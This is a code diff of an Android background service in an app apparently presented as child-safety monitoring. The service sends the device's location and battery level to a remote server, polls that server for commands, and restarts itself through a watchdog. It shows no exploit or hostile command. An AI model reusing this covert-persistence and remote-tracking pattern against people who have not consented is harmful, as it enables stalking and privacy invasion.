@@ -4,9 +4,7 @@ import android.annotation.SuppressLint;
 import android.app.*;
 import android.content.*;
 import android.content.pm.ServiceInfo;
-import android.location.Location;
-import android.location.LocationListener;
-import android.location.LocationManager;
+import android.location.*;
 import android.os.*;
 import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
@@ -23,6 +21,7 @@ public class CompanionSyncService extends Service {
     private PowerManager.WakeLock wakeLock; private long lastPersistTime = 0;
     private double lastLat = 0, lastLng = 0;
     public static volatile boolean isLiveMovementActive = false;
+    public static volatile boolean isFetchRequested = false;
 
     @Override
     public void onCreate() {
@@ -49,14 +48,30 @@ public class CompanionSyncService extends Service {
         } catch (Throwable t) {
             try { startForeground(NOTIF_ID, buildNotification()); } catch (Throwable ignored) {}
         }
+        if (intent != null && "ACTION_FETCH_LOCATION".equals(intent.getAction())) {
+            requestActiveLocationFix();
+            return START_STICKY;
+        }
         startPeriodicSync();
-        requestActiveLocationFix();
         syncInitialTelemetry();
         WatchdogReceiver.scheduleWatchdog(this);
         return START_STICKY;
     }
 
-    public static void setLiveMovementActive(Context ctx, boolean active) { isLiveMovementActive = active; }
+    public static void setLiveMovementActive(Context ctx, boolean active) {
+        isLiveMovementActive = active;
+        if (active) triggerOnDemandLocationFix(ctx);
+    }
+
+    public static void triggerOnDemandLocationFix(Context ctx) {
+        isFetchRequested = true;
+        try {
+            Intent it = new Intent(ctx, CompanionSyncService.class);
+            it.setAction("ACTION_FETCH_LOCATION");
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(it);
+            else ctx.startService(it);
+        } catch (Throwable ignored) {}
+    }
 
     private void syncInitialTelemetry() {
         final String d = prefs.getString("device_id", null), s = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
@@ -70,17 +85,16 @@ public class CompanionSyncService extends Service {
 
     @SuppressLint("MissingPermission")
     private void requestActiveLocationFix() {
+        if (!isLiveMovementActive && !isFetchRequested) return;
         if (locationManager == null || locationListener == null) return;
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                long interval = isLiveMovementActive ? 3000L : 20000L;
-                float dist = isLiveMovementActive ? 1.0f : 5.0f;
+                long interval = isLiveMovementActive ? 3000L : 15000L;
+                float dist = isLiveMovementActive ? 1.0f : 0.0f;
                 Location best = null;
                 for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
                     try {
-                        if (locationManager.isProviderEnabled(p)) {
-                            locationManager.requestLocationUpdates(p, interval, dist, locationListener, Looper.getMainLooper());
-                        }
+                        if (locationManager.isProviderEnabled(p)) locationManager.requestLocationUpdates(p, interval, dist, locationListener, Looper.getMainLooper());
                     } catch (Throwable ignored) {}
                     try {
                         Location last = locationManager.getLastKnownLocation(p);
@@ -95,13 +109,13 @@ public class CompanionSyncService extends Service {
     }
 
     private void dispatchLocation(Location loc) {
+        if (!isLiveMovementActive && !isFetchRequested) return;
         final String deviceId = prefs.getString("device_id", null);
         final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
         if (deviceId == null || loc == null) return;
         if (loc.hasAccuracy() && loc.getAccuracy() > 1500.0f) return;
         double lat = loc.getLatitude(), lng = loc.getLongitude();
         if (Math.abs(lat) < 0.0001 && Math.abs(lng) < 0.0001) return;
-        if (!isLiveMovementActive && Math.abs(lat - lastLat) < 0.00002 && Math.abs(lng - lastLng) < 0.00002) return;
         lastLat = lat; lastLng = lng;
 
         try {
@@ -109,16 +123,13 @@ public class CompanionSyncService extends Service {
                 long now = System.currentTimeMillis();
                 boolean shouldPersist = (now - lastPersistTime) >= PERSIST_INTERVAL_MS;
                 JSONObject b = new JSONObject();
-                b.put("device_id", deviceId);
-                b.put("latitude", lat);
-                b.put("longitude", lng);
-                b.put("accuracy", loc.getAccuracy());
-                b.put("speed", loc.hasSpeed() ? loc.getSpeed() : 0);
-                b.put("battery_level", getBatteryLevel());
-                b.put("persist", shouldPersist);
+                b.put("device_id", deviceId); b.put("latitude", lat); b.put("longitude", lng);
+                b.put("accuracy", loc.getAccuracy()); b.put("speed", loc.hasSpeed() ? loc.getSpeed() : 0);
+                b.put("battery_level", getBatteryLevel()); b.put("persist", shouldPersist);
                 if (shouldPersist) lastPersistTime = now;
                 ApiClient.postJson(serverUrl + "/api/device-sync/live-location", b, null);
-            } else {
+            } else if (isFetchRequested) {
+                isFetchRequested = false;
                 ApiClient.sendLocation(serverUrl, deviceId, lat, lng, loc.getAccuracy(), getBatteryLevel(), null);
             }
         } catch (Throwable ignored) {}
@@ -129,25 +140,20 @@ public class CompanionSyncService extends Service {
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleWithFixedDelay(() -> {
             try {
-                requestActiveLocationFix();
+                if (isLiveMovementActive || isFetchRequested) requestActiveLocationFix();
                 pollServerCommands();
             } catch (Throwable ignored) {}
         }, 2, 10, TimeUnit.SECONDS);
     }
 
     private void pollServerCommands() {
-        final String deviceId = prefs.getString("device_id", null);
-        final String serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
+        final String deviceId = prefs.getString("device_id", null), serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
         if (deviceId == null) return;
-
         ApiClient.sendHeartbeat(serverUrl, deviceId, getBatteryLevel(), false, new ApiClient.ApiCallback() {
-            @Override
-            public void onSuccess(JSONObject res) {
+            @Override public void onSuccess(JSONObject res) {
                 try {
                     JSONObject rt = res.optJSONObject("realtime");
-                    if (rt != null) {
-                        RealtimeSocketManager.getInstance(CompanionSyncService.this).connect(rt.optString("ws_url"), deviceId, serverUrl);
-                    }
+                    if (rt != null) RealtimeSocketManager.getInstance(CompanionSyncService.this).connect(rt.optString("ws_url"), deviceId, serverUrl);
                     JSONArray cmds = res.optJSONArray("commands");
                     if (cmds != null && cmds.length() > 0) {
                         for (int i = 0; i < cmds.length(); i++) {
@@ -177,17 +183,13 @@ public class CompanionSyncService extends Service {
     }
 
     private Notification buildNotification() {
-        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class),
-                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
-        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Snap Safety")
-                .setContentText("Child protection active").setSmallIcon(R.drawable.ic_launcher)
-                .setContentIntent(pi).setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build();
+        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
+        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Snap Safety").setContentText("Child protection active").setSmallIcon(R.drawable.ic_launcher).setContentIntent(pi).setOngoing(true).setPriority(NotificationCompat.PRIORITY_MIN).build();
     }
 
     @Override public IBinder onBind(Intent intent) { return null; }
 
-    @Override
-    public void onDestroy() {
+    @Override public void onDestroy() {
         super.onDestroy();
         WatchdogReceiver.scheduleWatchdog(this);
         if (scheduler != null) scheduler.shutdownNow();
